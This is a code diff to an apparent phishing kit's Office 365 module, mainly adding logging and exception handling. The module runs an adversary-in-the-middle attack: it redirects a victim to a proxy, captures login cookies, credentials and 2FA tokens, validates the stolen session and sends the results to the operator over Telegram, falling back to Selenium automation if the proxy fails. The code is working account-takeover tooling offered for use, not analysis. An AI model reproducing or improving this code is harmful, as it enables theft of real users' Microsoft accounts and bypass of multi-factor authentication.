@@ -126,15 +126,21 @@ class Office365Module(BaseModule):
     def _start_proxy_and_redirect_victim(self):
         """Start AiTM proxy immediately and redirect victim to it"""
         try:
+            self.log(f"[AiTM] Starting proxy setup for victim: {getattr(self, 'user', 'Unknown')}")
+            
             # For our Flask-based proxy, we don't need the separate mitmproxy instance
             # The proxy functionality is built into the Flask routes
             
             # Get the public proxy URL using current host
             current_host = request.host
+            self.log(f"[AiTM] Current host detected: {current_host}")
+            
             public_proxy_url = f"https://{current_host}/proxy"
+            self.log(f"[AiTM] Public proxy URL constructed: {public_proxy_url}")
             
             # Set the appropriate target domain based on user email
             if hasattr(self, 'user') and self.user:
+                self.log(f"[AiTM] User attribute found: {self.user}")
                 personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                 is_personal = any(domain in self.user.lower() for domain in personal_domains)
                 
@@ -144,78 +150,148 @@ class Office365Module(BaseModule):
                 else:
                     self.log(f"[AiTM] Targeting organizational account flow for {self.user}")
                     # For organizational accounts, we'll proxy login.microsoftonline.com
+            else:
+                self.log(f"[AiTM] WARNING: User attribute not found or empty")
             
             self.aitm_proxy_url = public_proxy_url
+            self.log(f"[AiTM] Set aitm_proxy_url to: {self.aitm_proxy_url}")
             
             # Initialize proxy data storage
-            if not hasattr(self.aitm_manager, 'proxy'):
-                self.aitm_manager.proxy = type('ProxyData', (), {
-                    'captured_data': {'cookies': [], 'credentials': {}, 'session_info': {}}
-                })()
+            self.log(f"[AiTM] Checking aitm_manager: {type(self.aitm_manager)}")
+            if not hasattr(self.aitm_manager, 'proxy') or self.aitm_manager.proxy is None:
+                self.log(f"[AiTM] Creating proxy data storage object")
+                
+                # Create a proper proxy data object with the expected methods
+                class ProxyData:
+                    def __init__(self):
+                        self.captured_data = {'cookies': [], 'credentials': {}, 'session_info': {}}
+                    
+                    def get_captured_data(self):
+                        return self.captured_data.copy()
+                    
+                    def validate_captured_cookies(self):
+                        return {'valid': len(self.captured_data.get('cookies', [])) > 0, 'error': None}
+                    
+                    def stop_proxy(self):
+                        print(f"[ProxyData] Stop proxy called - no actual proxy to stop")
+                        return True
+                
+                self.aitm_manager.proxy = ProxyData()
+                self.log(f"[AiTM] Proxy data storage created successfully with methods: {dir(self.aitm_manager.proxy)}")
+            else:
+                self.log(f"[AiTM] Proxy data storage already exists: {type(self.aitm_manager.proxy)}")
             
             # Start background monitoring for captured data
+            self.log(f"[AiTM] Starting background monitoring...")
             self._start_aitm_monitoring()
+            self.log(f"[AiTM] Background monitoring started successfully")
             
             # Immediately redirect victim to the proxy URL 
             self.log(f"[AiTM] Redirecting victim {self.user} to Flask proxy: {public_proxy_url}")
-            return redirect(public_proxy_url, code=302)
+            redirect_response = redirect(public_proxy_url, code=302)
+            self.log(f"[AiTM] Redirect response created successfully: {type(redirect_response)}")
+            return redirect_response
                 
         except Exception as ex:
-            self.log(f"[AiTM] Exception starting proxy: {ex}")
+            import traceback
+            tb = traceback.format_exc()
+            self.log(f"[AiTM] CRITICAL EXCEPTION in _start_proxy_and_redirect_victim: {ex}")
+            self.log(f"[AiTM] FULL TRACEBACK: {tb}")
             self.attack_mode = "selenium"
+            fallback_msg = (
+                f"*⚠️ AiTM Proxy Failed - Selenium Fallback*\n"
+                f"Email: `{getattr(self, 'user', 'Unknown')}`\n"
+                f"Error: `{str(ex)}`\n"
+                f"🔄 Falling back to Selenium automation..."
+            )
+            self.send_telegram(fallback_msg)
             return self._handle_selenium_attack()
 
     def _start_aitm_monitoring(self):
         """Start background monitoring for AiTM capture results"""
-        import threading
-        
-        def _monitor_aitm_results():
-            try:
-                # Monitor for 5 minutes for victim interaction
-                start_time = time.time()
-                timeout = 300  # 5 minutes
-                
-                while time.time() - start_time < timeout:
-                    time.sleep(10)  # Check every 10 seconds
-
+        try:
+            self.log(f"[AiTM] _start_aitm_monitoring called")
+            import threading
+            self.log(f"[AiTM] Threading imported successfully")
+            
+            def _monitor_aitm_results():
+                try:
+                    self.log(f"[AiTM] Background monitor thread started")
+                    # Monitor for 5 minutes for victim interaction
+                    start_time = time.time()
+                    timeout = 300  # 5 minutes
+                    self.log(f"[AiTM] Monitor timeout set to {timeout} seconds")
                     
-                    # Get captured data from proxy
-                    captured_data = self.aitm_manager.get_attack_results()
-                    
-
-                    # Check if we captured anything
-                    if captured_data.get('cookies') or captured_data.get('credentials') or captured_data.get('session_info', {}).get('auth_success'):
-                        # We got something! Validate and send results
-                        validation_result = self.aitm_manager.validate_session()
-                        self._send_aitm_results(self.user, self.captured_password, self.two_factor_token, captured_data, validation_result)
+                    while time.time() - start_time < timeout:
+                        time.sleep(10)  # Check every 10 seconds
+                        self.log(f"[AiTM] Monitor check - elapsed: {int(time.time() - start_time)}s")
                         
-                        # Success! Stop monitoring
-                        self.log(f"[AiTM] Successfully captured session data for {self.user}")
-                        break
+                        # Get captured data from proxy
+                        try:
+                            captured_data = self.aitm_manager.get_attack_results()
+                            self.log(f"[AiTM] Retrieved attack results: {bool(captured_data)}")
+                        except Exception as get_ex:
+                            self.log(f"[AiTM] Exception getting attack results: {get_ex}")
+                            captured_data = {}
+
+                        # Check if we captured anything
+                        if captured_data.get('cookies') or captured_data.get('credentials') or captured_data.get('session_info', {}).get('auth_success'):
+                            self.log(f"[AiTM] Data captured! Validating session...")
+                            # We got something! Validate and send results
+                            try:
+                                validation_result = self.aitm_manager.validate_session()
+                                self.log(f"[AiTM] Session validation completed")
+                                self._send_aitm_results(self.user, self.captured_password, self.two_factor_token, captured_data, validation_result)
+                                self.log(f"[AiTM] Results sent via Telegram")
+                            except Exception as val_ex:
+                                self.log(f"[AiTM] Exception during validation/sending: {val_ex}")
+                            
+                            # Success! Stop monitoring
+                            self.log(f"[AiTM] Successfully captured session data for {self.user}")
+                            break
+                            
+                    else:
+                        # Timeout reached, no cookies captured
+                        self.log(f"[AiTM] Timeout reached - no session data captured for {self.user}")
                         
-                else:
-                    # Timeout reached, no cookies captured
-                    self.log(f"[AiTM] Timeout reached - no session data captured for {self.user}")
-                    
-                    # Optional: Fall back to Selenium after timeout
-                    timeout_msg = (
-                        f"*O365 AiTM Timeout*\n"
-                        f"Email: `{self.user}`\n"
-                        f"⚠️ Victim did not complete authentication through proxy\n"
-                        f"🔄 Falling back to Selenium automation..."
-                    )
-                    self.send_telegram(timeout_msg)
-                    
-                    # Start Selenium fallback
-                    self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)
-                    
-            except Exception as ex:
-                self.log(f"[AiTM] Monitor exception: {ex}")
-            finally:
-                # Always stop the proxy when done
-                self.aitm_manager.stop_aitm_attack()
-        
-        threading.Thread(target=_monitor_aitm_results, daemon=True).start()
+                        # Optional: Fall back to Selenium after timeout
+                        timeout_msg = (
+                            f"*O365 AiTM Timeout*\n"
+                            f"Email: `{self.user}`\n"
+                            f"⚠️ Victim did not complete authentication through proxy\n"
+                            f"🔄 Falling back to Selenium automation..."
+                        )
+                        self.send_telegram(timeout_msg)
+                        
+                        # Start Selenium fallback
+                        self._selenium_fallback(self.user, self.captured_password, self.two_factor_token)
+                        
+                except Exception as ex:
+                    import traceback
+                    tb = traceback.format_exc()
+                    self.log(f"[AiTM] Monitor thread exception: {ex}")
+                    self.log(f"[AiTM] Monitor thread traceback: {tb}")
+                finally:
+                    # Always stop the proxy when done
+                    try:
+                        self.log(f"[AiTM] Stopping AiTM attack...")
+                        self.aitm_manager.stop_aitm_attack()
+                        self.log(f"[AiTM] AiTM attack stopped")
+                    except Exception as stop_ex:
+                        self.log(f"[AiTM] Exception stopping attack: {stop_ex}")
+            
+            self.log(f"[AiTM] Creating monitor thread...")
+            monitor_thread = threading.Thread(target=_monitor_aitm_results, daemon=True)
+            self.log(f"[AiTM] Starting monitor thread...")
+            monitor_thread.start()
+            self.log(f"[AiTM] Monitor thread started successfully")
+            
+        except Exception as monitor_ex:
+            import traceback
+            tb = traceback.format_exc()
+            self.log(f"[AiTM] CRITICAL EXCEPTION in _start_aitm_monitoring: {monitor_ex}")
+            self.log(f"[AiTM] MONITORING TRACEBACK: {tb}")
+            raise  # Re-raise the exception so it's caught by the parent method
 
     def _handle_aitm_attack(self):
         """Legacy method - replaced by _start_proxy_and_redirect_victim"""
